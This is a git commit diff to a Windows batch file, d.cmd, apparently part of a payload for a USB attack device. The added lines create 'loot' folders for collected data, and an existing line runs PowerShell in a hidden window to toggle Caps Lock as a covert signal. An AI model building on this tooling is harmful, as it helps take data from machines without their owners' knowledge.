c83192cc7081450ae686383fb5169e609d2140a8
FurqanKhan1 <furqankhan08@gmail.com>
2019-11-25 19:39:11 +0400

    Update d.cmd

--- d.cmd
+++ d.cmd
@@ -1,4 +1,8 @@
 @echo off
+set khan=/root/udisk/loot/not_khan
+mkdir %khan% >>nul
+set khan0=/root/loot/not_khan
+mkdir %khan0% >>nul
 set khan1=/root/udisk/payloads/exe_d
 mkdir %khan1% >>nul
 start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
